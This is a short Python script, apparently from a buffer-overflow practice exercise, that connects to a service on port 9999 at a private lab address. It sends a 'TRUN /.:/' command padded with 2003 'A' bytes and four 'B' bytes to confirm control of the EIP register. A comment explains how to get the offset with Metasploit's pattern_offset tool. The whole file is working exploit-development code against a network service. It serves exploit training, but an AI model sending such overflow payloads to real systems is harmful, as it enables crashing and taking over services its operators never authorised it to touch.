#!/usr/bin/python3
#use the address at the EIP after finding the offset to find the pattern with /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q [address] (without brackets) 
import sys
import socket

RHOST = '192.168.17.1'
RPORT = 9999
offset = b'A' * 2003 + b'B' * 4

try:
	payload = b'TRUN /.:/' + offset
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((RHOST,RPORT))
	s.send((payload))
	print('Fuzzing with TRUN command with %s bytes'% str(len(offset)))
	s.close()
except:
	print('error connecting to server')
	sys.exit()
